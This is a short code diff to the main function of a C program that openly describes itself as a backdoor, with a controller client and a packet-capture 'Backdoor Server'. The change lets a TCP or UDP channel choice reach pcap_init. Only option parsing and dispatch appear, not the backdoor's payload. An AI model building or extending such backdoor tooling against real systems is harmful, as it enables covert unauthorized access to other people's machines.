@@ -41,7 +41,7 @@
 int main(int argc, char *argv[]) {
 	extern char* optarg;
 	extern int optind, optopt;
-	int c;
+	int c, chan = 1;
 	bool client = false;
 	char channel[4];
 	char lclhost[MAX_LEN];
@@ -77,8 +77,10 @@ int main(int argc, char *argv[]) {
 		case 'x': // channel
 			if (tolower(optarg[0]) == 't') {
 				strcpy(channel, "tcp");
+				chan = 1;
 			} else if (tolower(optarg[0]) == 'u') {
 				strcpy(channel, "udp");
+				chan = 2;
 			}
 			break;
 		case ':': // Missing operand.
@@ -100,7 +102,7 @@ int main(int argc, char *argv[]) {
 	if (client) { // Controller Client
 		backdoor_client(src_addr, dst_addr, channel);
 	} else { // Backdoor Server
-		pcap_init(src_addr, dst_addr, folder, 1);
+		pcap_init(src_addr, dst_addr, folder, chan);
 	}
 
 	return EXIT_SUCCESS;
